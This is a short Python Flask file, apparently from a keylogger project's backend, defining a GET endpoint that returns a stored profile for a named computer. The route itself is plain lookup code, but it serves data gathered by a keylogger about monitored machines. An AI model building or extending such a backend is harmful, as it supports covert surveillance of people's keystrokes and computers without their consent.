from flask import Blueprint, jsonify, request
from keyloggerBackend.app.logic import profile_logic as profile
from keyloggerBackend.app.logic.save_data_logic import WriteToNetwork



get_profile_by_computer_bp = Blueprint('getProfileByComputer', __name__, url_prefix='/getProfileByComputer')
@get_profile_by_computer_bp.route('/<computer_name>', methods=['GET'])
def get_profile_by_computer(computer_name):


    profile_about_user =profile.get_profile_by_computer(computer_name)
    print(profile_about_user)

    if not profile_about_user:
        return jsonify({"status": "fail", "error": "Invalid credentials"}), 401
    else:
        print(type(profile_about_user), profile_about_user)
        return jsonify({"profile": profile_about_user}), 200

        # return jsonify( profile_about_user), 200
